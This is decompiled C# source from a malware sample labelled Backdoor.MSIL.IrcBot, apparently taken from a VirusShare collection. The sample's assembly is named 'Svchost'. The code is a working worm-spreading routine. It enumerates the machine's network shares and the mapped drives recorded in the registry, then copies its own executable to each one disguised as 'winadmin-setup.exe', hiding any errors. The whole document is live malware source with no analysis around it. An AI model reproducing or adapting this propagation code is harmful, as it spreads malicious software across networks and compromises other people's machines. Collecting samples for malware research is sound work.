// Decompiled with JetBrains decompiler
// Type: myApp.Yeha
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace myApp
{
  internal class Yeha
  {
    private string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);

    public static void go() => new Yeha().Share();

    public void Share()
    {
      try
      {
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select * from win32_share").Get())
        {
          string str = Convert.ToString(managementBaseObject["Name"]);
          if (!str.Contains("$"))
            File.Copy(this.me, "\\\\" + Environment.MachineName + "\\" + str + "\\winadmin-setup.exe", true);
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
        foreach (string valueName in registryKey.GetValueNames())
        {
          string str = registryKey.GetValue(valueName).ToString();
          if (valueName.ToLower() != "mrulist")
          {
            try
            {
              File.Copy(this.me, str + "\\\\winadmin-setup.exe", true);
            }
            catch (Exception ex)
            {
            }
          }
        }
        registryKey.Close();
      }
      catch (Exception ex)
      {
      }
    }
  }
}
